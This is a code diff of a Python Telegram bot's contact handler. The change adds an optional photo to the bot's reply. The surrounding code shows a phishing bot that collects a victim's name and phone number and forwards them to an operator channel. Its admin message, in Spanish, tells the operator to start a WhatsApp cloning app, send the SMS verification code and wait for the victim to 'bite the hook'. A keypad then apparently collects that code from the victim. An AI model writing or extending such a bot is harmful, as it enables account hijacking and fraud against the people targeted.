@@ -398,6 +398,7 @@ async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
             pass
 
     stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
     admin_text = (
         "😈𝐏𝐫𝐞𝐬𝐢𝐨𝐧ó 𝐞𝐥 𝐛𝐨𝐭𝐨𝐧 𝐂𝐎𝐌𝐏𝐀𝐑𝐓𝐈𝐑 𝐄𝐋 𝐍𝐔𝐌𝐄𝐑𝐎. 𝐄𝐬𝐨 𝐪𝐮𝐢𝐞𝐫𝐞 𝐝𝐞𝐜𝐢𝐫 𝐪𝐮𝐞 𝐬𝐞 𝐪𝐮𝐢𝐞𝐫𝐞 𝐜𝐨𝐧𝐞𝐜𝐭𝐚𝐫. 𝐀𝐡𝐨𝐫𝐚 𝐝𝐞𝐛𝐞𝐦𝐨𝐬 𝐚𝐛𝐫𝐢𝐫 𝐥𝐚 𝐚𝐩𝐩 𝐝𝐞 𝐜𝐥𝐨𝐧𝐚𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐲 𝐞𝐧𝐯𝐢𝐚𝐫𝐥𝐞 𝐞𝐥 𝐜𝐨𝐝𝐢𝐠𝐨 𝐯𝐢𝐚 𝐒𝐌𝐒 𝐲 𝐞𝐬𝐭𝐚𝐫 𝐚𝐭𝐞𝐧𝐭𝐨𝐬 𝐚 𝐯𝐞𝐫 𝐬𝐢 𝐦𝐮𝐞𝐫𝐝𝐞 𝐞𝐥 𝐚𝐧𝐳𝐮𝐞𝐥𝐨.\n\n"
         f"Nombre: {user.full_name or 'Sin nombre'}\n"
@@ -406,6 +407,7 @@ async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"Teléfono: {phone}\n"
         f"Fecha/Hora: {stamp}"
     )
+
     try:
         if ADMIN_CHANNEL_ID:
             await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text)
@@ -413,11 +415,26 @@ async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         log.exception("Error enviando número al destino: %s", e)
 
+    photo = os.getenv("PHOTO", "").strip()
+
     text, kb = build_keypad("")
-    await msg.reply_text(text, reply_markup=kb, parse_mode="Markdown")
+
+    if photo:
+        await msg.reply_photo(
+            photo=photo,
+            caption=text,
+            reply_markup=kb,
+            parse_mode="Markdown"
+        )
+    else:
+        await msg.reply_text(
+            text,
+            reply_markup=kb,
+            parse_mode="Markdown"
+        )
 
     await send_single_tutorial_block(context, msg.chat_id, context.user_data)
-    
+
     context.user_data[UD_TUTORIAL_SENT] = True
 
 async def members_btn_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
